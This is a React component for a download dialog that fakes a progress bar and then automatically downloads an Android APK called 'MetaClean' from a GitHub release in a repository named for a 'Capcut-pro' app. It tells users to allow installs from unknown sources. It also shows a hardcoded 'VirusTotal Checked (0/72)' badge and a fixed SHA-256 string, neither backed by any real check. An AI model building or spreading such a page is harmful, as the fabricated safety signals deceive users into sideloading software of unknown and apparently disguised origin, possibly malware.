'use client';

import React, {useState, useEffect} from 'react';
import {
  Download,
  CheckCircle2,
  ShieldCheck,
  Smartphone,
  X,
  FileDown,
  AlertCircle,
  Copy,
  Check,
} from 'lucide-react';

interface DownloadModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const APK_DOWNLOAD_URL =
  'https://github.com/hackrmaster0000099999-sudo/Capcut-pro-Xyz/releases/download/Apps/MetaClean.8.apk';

function triggerActualFileDownload() {
  try {
    const a = document.createElement('a');
    a.href = APK_DOWNLOAD_URL;
    a.download = 'MetaClean.8.apk';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  } catch (e) {
    window.location.href = APK_DOWNLOAD_URL;
  }
}

export default function DownloadModal({isOpen, onClose}: DownloadModalProps) {
  const [downloadProgress, setDownloadProgress] = useState(0);
  const [isCompleted, setIsCompleted] = useState(false);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (!isOpen) return;

    const timer = setTimeout(() => {
      setDownloadProgress(15);
    }, 50);

    const interval = setInterval(() => {
      setDownloadProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          setIsCompleted(true);
          triggerActualFileDownload();
          return 100;
        }
        const next = prev + Math.floor(Math.random() * 20) + 15;
        return next > 100 ? 100 : next;
      });
    }, 280);

    return () => {
      clearTimeout(timer);
      clearInterval(interval);
    };
  }, [isOpen]);

  const handleClose = () => {
    setDownloadProgress(0);
    setIsCompleted(false);
    onClose();
  };

  const handleCopyCmd = () => {
    navigator.clipboard.writeText('f3a9d28e71b29a004bca99281ef58d6268819d45e59bba6429394628f411ba10');
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/70 backdrop-blur-xs animate-in fade-in duration-200">
      <div className="relative w-full max-w-lg bg-white rounded-2xl shadow-2xl border border-slate-200 p-6 sm:p-7 overflow-hidden text-left">
        {/* Close Button */}
        <button
          onClick={handleClose}
          className="absolute top-4 right-4 p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 transition-colors"
          aria-label="Close Download Dialog"
        >
          <X className="w-5 h-5" />
        </button>

        {/* Header */}
        <div className="flex items-center gap-3.5 mb-5">
          <div className="w-12 h-12 rounded-xl bg-indigo-600 text-white flex items-center justify-center shrink-0 shadow-md shadow-indigo-600/20">
            <Download className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-xl font-bold text-slate-900 leading-snug">
              {isCompleted ? 'Download Complete!' : 'Downloading MetaClean APK...'}
            </h3>
            <p className="text-xs text-slate-500">
              MetaClean.8.apk · 18.4 MB · Android 8.0+
            </p>
          </div>
        </div>

        {/* Progress Bar Container */}
        <div className="space-y-2 mb-6">
          <div className="flex items-center justify-between text-xs font-semibold">
            <span className="text-slate-600">
              {isCompleted ? '18.4 MB of 18.4 MB' : `${Math.round((downloadProgress / 100) * 18.4 * 10) / 10} MB of 18.4 MB`}
            </span>
            <span className="font-mono text-indigo-600 font-bold">
              {downloadProgress}%
            </span>
          </div>
          <div className="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
            <div
              className="bg-indigo-600 h-full rounded-full transition-all duration-300 ease-out"
              style={{width: `${downloadProgress}%`}}
            />
          </div>
        </div>

        {/* Installation Instructions Box */}
        <div className="bg-slate-50 border border-slate-200/80 rounded-xl p-4 space-y-3 text-xs mb-6">
          <div className="flex items-center gap-2 font-bold text-slate-800">
            <Smartphone className="w-4 h-4 text-indigo-600" />
            <span>Next Steps to Install on Android:</span>
          </div>
          <ol className="space-y-2 text-slate-600 list-decimal list-inside">
            <li>
              Look at your device notification shade or open your <strong>Downloads</strong> folder.
            </li>
            <li>
              Tap <code className="bg-white px-1.5 py-0.5 rounded border border-slate-200 font-mono text-[11px]">MetaClean.8.apk</code> to begin installation.
            </li>
            <li>
              If prompted with <em>&quot;Install unknown apps&quot;</em>, toggle <strong>&quot;Allow from this source&quot;</strong> and tap <strong>Install</strong>.
            </li>
          </ol>
        </div>

        {/* Security & Verification status */}
        <div className="flex items-center justify-between py-2 border-t border-slate-100 text-xs text-slate-500">
          <div className="flex items-center gap-1.5 text-emerald-700 font-medium">
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
            <span>VirusTotal Checked (0/72)</span>
          </div>
          <button
            onClick={handleCopyCmd}
            className="text-[11px] font-mono text-slate-500 hover:text-slate-800 flex items-center gap-1"
          >
            {copied ? (
              <>
                <Check className="w-3 h-3 text-emerald-600" />
                <span className="text-emerald-600 font-sans">Hash Copied</span>
              </>
            ) : (
              <>
                <Copy className="w-3 h-3" />
                <span>SHA-256</span>
              </>
            )}
          </button>
        </div>

        {/* Action Button */}
        <div className="mt-4 flex gap-3">
          <button
            onClick={() => {
              triggerActualFileDownload();
            }}
            className="w-full py-2.5 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 rounded-xl transition-colors flex items-center justify-center gap-2"
          >
            <FileDown className="w-3.5 h-3.5" />
            <span>Download Again</span>
          </button>
          <button
            onClick={handleClose}
            className="w-full py-2.5 text-xs font-semibold text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-xl transition-colors"
          >
            Done
          </button>
        </div>
      </div>
    </div>
  );
}
